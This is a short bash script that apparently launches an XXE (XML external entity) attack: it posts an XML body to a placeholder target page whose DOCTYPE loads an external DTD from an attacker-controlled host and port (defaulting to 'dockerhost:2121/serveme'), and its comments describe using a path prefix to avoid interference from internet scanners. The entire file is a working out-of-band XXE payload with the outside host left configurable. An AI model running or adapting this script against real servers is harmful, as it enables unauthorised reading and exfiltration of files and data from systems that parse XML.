#!/bin/bash

#the dtds should be loaded from httpt://${host}:${port}/${prefix}anything_after_prefix_is_ignored
#this is used to avoid interference e.g. from internet scanners

host=${1:-dockerhost}
port=${2:-2121}
prefix=${3:-serveme}

curl "https://target_x/page" -H 'Content-Type: application/xml' -d "<!DOCTYPE r SYSTEM \"http://${host}:${port}/${prefix}\"><r></r>"